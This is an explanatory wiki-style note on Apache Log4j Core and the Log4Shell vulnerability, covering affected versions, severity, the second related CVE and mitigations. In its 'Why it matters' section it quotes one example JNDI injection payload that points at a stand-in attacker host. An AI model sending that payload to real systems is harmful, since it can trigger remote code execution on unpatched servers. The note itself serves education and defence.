# Log4j Core

## What it is
Think of Log4j Core like a postal sorting facility that not only stores incoming mail but also *executes instructions written on the envelopes*. Log4j Core is the runtime implementation library of the Apache Log4j 2 logging framework for Java applications, responsible for processing log messages, managing appenders, and formatting output. The critical distinction from "Log4j API" is that Core is where actual message evaluation happens — including the fatally flawed JNDI lookup feature.

## Why it matters
In December 2021, CVE-2021-44228 ("Log4Shell") revealed that Log4j Core versions 2.0-beta9 through 2.14.1 would evaluate JNDI lookup strings embedded in log messages — meaning an attacker could send `${jndi:ldap://evil.com/exploit}` in a User-Agent header, force the server to log it, and trigger remote code execution by fetching a malicious Java class from attacker-controlled infrastructure. This affected hundreds of millions of devices globally and became one of the most actively exploited vulnerabilities ever catalogued by CISA.

## Key facts
- **CVE-2021-44228** (Log4Shell): CVSS score 10.0 — maximum severity; affects Log4j Core 2.0-beta9 to 2.14.1
- The vulnerability stems from **JNDI (Java Naming and Directory Interface)** lookup feature processing user-controlled input without sanitization
- Attack vector is **unauthenticated remote code execution** via any field the application logs (headers, form data, usernames)
- Mitigation options include: upgrading to 2.17.1+, setting `log4j2.formatMsgNoLookups=true`, or removing the JndiLookup class from the classpath
- A second related CVE, **CVE-2021-45046**, bypassed the initial incomplete patch — emphasizing why full upgrades beat configuration workarounds

## Related concepts
[[JNDI Injection]] [[Remote Code Execution]] [[CVE Scoring and CVSS]] [[Supply Chain Vulnerabilities]] [[Patch Management]]